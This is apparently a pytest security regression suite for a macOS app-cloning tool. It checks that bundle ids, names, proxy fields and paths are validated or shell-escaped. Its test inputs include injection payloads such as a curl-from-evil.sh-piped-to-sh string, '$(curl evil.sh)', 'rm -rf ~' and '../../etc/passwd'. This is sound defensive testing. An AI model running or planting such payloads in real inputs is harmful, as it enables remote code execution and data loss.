"""Security regression tests for input validation and shell-escaping hardening.

These tests pin the fixes for the injection issues found in the clone engine:
untrusted values (source bundle ids, display names, recipe fields, paths) must
never reach the generated shell scripts unescaped/unvalidated.
"""

import shlex
from pathlib import Path
from unittest.mock import patch

import pytest

from atbclone.core.app_inspector import AppInspector
from atbclone.core.clone_task import CloneTask
from atbclone.core.engines import HardCloneEngine, SoftCloneEngine
from atbclone.core.models import AppInfo
from atbclone.validation import (
    escape_double_quoted,
    sanitize_name_component,
    validate_bundle_id,
    validate_clone_name,
    validate_display_name,
    validate_env_key,
    validate_host,
    validate_proxy_credential,
)
from atbclone.recipes.models import ProxyConfig, Recipe


# ---------------------------------------------------------------------------
# validation helpers
# ---------------------------------------------------------------------------


class TestValidationHelpers:
    @pytest.mark.parametrize(
        "bundle_id",
        ["com.tencent.xinWeChat", "ru.keepcoder.Telegram", "app.podcast.cosmos", "a", "My-App_1.2"],
    )
    def test_bundle_id_accepts_valid(self, bundle_id):
        assert validate_bundle_id(bundle_id) == bundle_id

    @pytest.mark.parametrize(
        "bundle_id",
        [
            '',
            'x" || curl evil.sh | sh || "',
            "$(id)",
            "`id`",
            "com.example.app; rm -rf ~",
            "../../etc/passwd",
            "has space",
            "newline\ninjection",
            ".starts.with.dot",
        ],
    )
    def test_bundle_id_rejects_malicious(self, bundle_id):
        with pytest.raises(ValueError):
            validate_bundle_id(bundle_id)

    def test_env_key_rules(self):
        assert validate_env_key("HOME") == "HOME"
        assert validate_env_key("CLAUDE_CONFIG_DIR") == "CLAUDE_CONFIG_DIR"
        for bad in ("FOO BAR", "A=B", "$(x)", "FOO;rm", "1ABC", "FOO-BAR", 'X"'):
            with pytest.raises(ValueError):
                validate_env_key(bad)

    def test_clone_name_rejects_path_traversal(self):
        for bad in ("../evil", "a/b", "a\\b", "..", ".", "", "   ", "na\nme"):
            with pytest.raises(ValueError):
                validate_clone_name(bad)
        assert validate_clone_name("微信工作版") == "微信工作版"
        assert validate_clone_name("ChatGPT-US 2") == "ChatGPT-US 2"

    def test_sanitize_name_component(self):
        assert sanitize_name_component("../../etc") == "..-..-etc"
        assert sanitize_name_component("App Name") == "App Name"
        assert sanitize_name_component("..") == "-"
        assert sanitize_name_component("a/b\\c") == "a-b-c"
        assert "x-y" == sanitize_name_component("x" + chr(0) + "y")  # NUL is replaced, not passed through

    def test_display_name_rejects_control_chars_only(self):
        assert validate_display_name('微信 (工作) "quoted"') == '微信 (工作) "quoted"'
        with pytest.raises(ValueError):
            validate_display_name("bad\nname")

    def test_escape_double_quoted_neutralises_shell_metacharacters(self):
        assert escape_double_quoted('$(id)') == "\\$(id)"
        assert escape_double_quoted("`id`") == "\\`id\\`"
        assert escape_double_quoted('say "hi"') == 'say \\"hi\\"'
        assert escape_double_quoted("back\\slash") == "back\\\\slash"
        # Plain unicode passes through untouched.
        assert escape_double_quoted("微信工作版") == "微信工作版"

    def test_proxy_validators(self):
        assert validate_host("127.0.0.1") == "127.0.0.1"
        assert validate_host("proxy.example.com") == "proxy.example.com"
        for bad_host in ('127.0.0.1" || x', "$(cmd)", "host name", "a`b"):
            with pytest.raises(ValueError):
                validate_host(bad_host)
        for bad_cred in ('pass"word', "pass$word", "pass word", "pass`word", "pass\\word"):
            with pytest.raises(ValueError):
                validate_proxy_credential(bad_cred)


# ---------------------------------------------------------------------------
# Pydantic models
# ---------------------------------------------------------------------------


class TestRecipeModelHardening:
    def _base_kwargs(self):
        return {
            "bundle_id": "com.example.app",
            "app_name": "Example",
            "strategy": "hard_clone",
        }

    def test_rejects_malicious_bundle_id(self):
        kwargs = {**self._base_kwargs(), "bundle_id": 'x" || evil || "'}
        with pytest.raises(ValueError):
            Recipe(**kwargs)

    def test_rejects_malicious_env_key(self):
        with pytest.raises(ValueError):
            Recipe(**self._base_kwargs(), environment_injection={"HOME": "/x", "EVIL; rm -rf": "/y"})

    def test_accepts_normal_env_keys(self):
        recipe = Recipe(**self._base_kwargs(), environment_injection={"HOME": "/x", "TMPDIR": "/y"})
        assert recipe.environment_injection == {"HOME": "/x", "TMPDIR": "/y"}

    def test_rejects_traversal_in_symlink_whitelist(self):
        with pytest.raises(ValueError):
            Recipe(**self._base_kwargs(), symlink_whitelist=["../../etc"])

    def test_proxy_config_field_validation(self):
        with pytest.raises(ValueError):
            ProxyConfig(host='127.0.0.1" || evil')
        with pytest.raises(ValueError):
            ProxyConfig(port=99999)
        with pytest.raises(ValueError):
            ProxyConfig(username="user$name")
        # A sane config still round-trips and builds a clean URL.
        proxy = ProxyConfig(enabled=True, type="http", host="127.0.0.1", port=7890)
        assert proxy.url == "http://127.0.0.1:7890"

    def test_proxy_validation_applies_on_assignment(self):
        # CLI/GUI flows mutate proxy fields after construction; assignment
        # must revalidate, otherwise the constructor checks are bypassable.
        proxy = ProxyConfig()
        with pytest.raises(ValueError):
            proxy.host = "$(curl evil.sh)"
        with pytest.raises(ValueError):
            proxy.password = 'p"wd'
        proxy.host = "proxy.internal"
        assert proxy.url.endswith("proxy.internal:1080")


# ---------------------------------------------------------------------------
# CloneTask chokepoint
# ---------------------------------------------------------------------------


def _app_info() -> AppInfo:
    return AppInfo(
        path=Path("/Applications/TestApp.app"),
        bundle_id="com.example.testapp",
        app_name="TestApp",
        executable=Path("/Applications/TestApp.app/Contents/MacOS/TestApp"),
        has_sandbox=False,
    )


def _recipe() -> Recipe:
    return Recipe(
        bundle_id="com.example.testapp",
        app_name="TestApp",
        strategy="hard_clone",
        environment_injection={"HOME": "{{ATB_DATA_DIR}}/Home", "TMPDIR": "{{ATB_DATA_DIR}}/Tmp"},
    )


def _task(**overrides) -> CloneTask:
    kwargs = dict(
        source=_app_info(),
        dest_path=Path("/tmp/out/TestApp2.app"),
        data_dir=Path("/tmp/data/TestApp2"),
        recipe=_recipe(),
        clone_name="TestApp2",
        new_bundle_id="com.example.testapp.atbclone.2",
        language="en",
    )
    kwargs.update(overrides)
    return CloneTask(**kwargs)


class TestCloneTaskChokepoint:
    def test_rejects_traversal_clone_name(self):
        with pytest.raises(ValueError, match="path separators"):
            _task(clone_name="../evil")

    def test_rejects_malicious_new_bundle_id(self):
        with pytest.raises(ValueError, match="new_bundle_id"):
            _task(new_bundle_id='com.x" || evil || ".atbclone.2')

    def test_rejects_control_chars_in_display_name(self):
        with pytest.raises(ValueError):
            _task(display_name="bad\nname")

    def test_rejects_control_chars_in_paths(self):
        with pytest.raises(ValueError):
            _task(data_dir=Path("/tmp/da\nta"))


# ---------------------------------------------------------------------------
# Generated-script escaping regressions
# ---------------------------------------------------------------------------


class TestGeneratedScriptEscaping:
    def test_display_name_command_substitution_is_neutralised(self):
        task = _task(
            display_name='$(touch /tmp/pwned) `x` "q"',
            recipe=Recipe(
                bundle_id="com.example.testapp",
                app_name="TestApp",
                strategy="soft_clone",
            ),
        )
        with patch("atbclone.executor.runner.Runner.run") as mock_run:
            SoftCloneEngine.execute(task, needs_admin=False)
            script, _ = mock_run.call_args[0]

        # The PlistBuddy value must carry backslash-escaped metacharacters...
        assert "Set :CFBundleDisplayName \\$(touch /tmp/pwned) \\`x\\` \\\"q\\\"" in script
        # ...and the raw payloads must never appear unescaped.
        assert '"Set :CFBundleDisplayName $(touch /tmp/pwned)' not in script
        assert "$(touch /tmp/pwned) `" not in script.replace("\\$(touch /tmp/pwned) \\`", "")

    def test_data_dir_with_shell_metachars_is_shlex_quoted(self):
        data_dir = Path("/tmp/atb$data dir")
        task = _task(data_dir=data_dir)
        with patch("atbclone.executor.runner.Runner.run") as mock_run:
            HardCloneEngine.execute(task, needs_admin=False)
            script, _ = mock_run.call_args[0]

        quoted_prefs = shlex.quote(str(data_dir / "Home" / "Library" / "Preferences"))
        assert quoted_prefs.startswith("'") and "$" in quoted_prefs
        assert f"mkdir -p {quoted_prefs}" in script
        # No raw, unquoted interpolation of the metachar path may remain in a
        # *shell* context. (The C launcher source embeds the same value inside
        # a quoted heredoc with C-string escaping, where "$" is inert.)
        assert f'mkdir -p "{data_dir}' not in script
        assert f'"{data_dir}/Home"/' not in script
        assert f'"{data_dir}/Home/Library/Preferences"' not in script
        assert 'setenv("HOME", "/tmp/atb$data dir/Home", 1);' in script

    def test_bundle_id_injection_via_source_app_metadata_is_blocked(self):
        with pytest.raises(ValueError, match="Invalid bundle_id"):
            AppInspector.generate_bundle_id('x" || curl evil.sh | sh || "', 2)


# ---------------------------------------------------------------------------
# CLI-level rejection
# ---------------------------------------------------------------------------


class TestCliRejection:
    def test_clone_rejects_traversal_name_early(self, tmp_path):
        from click.testing import CliRunner

        from atbclone.cli.cmd_clone import clone

        app = tmp_path / "Evil.app"
        app.mkdir()
        runner = CliRunner()
        result = runner.invoke(clone, [str(app), "--name", "../evil"])
        assert result.exit_code == 1
        assert "--name" in result.output
        assert "path separators" in result.output

    def test_clone_rejects_metachar_display_name_early(self, tmp_path):
        from click.testing import CliRunner

        from atbclone.cli.cmd_clone import clone

        app = tmp_path / "Evil.app"
        app.mkdir()
        runner = CliRunner()
        result = runner.invoke(clone, [str(app), "--display-name", "bad\nname"])
        assert result.exit_code == 1
        assert "--display-name" in result.output
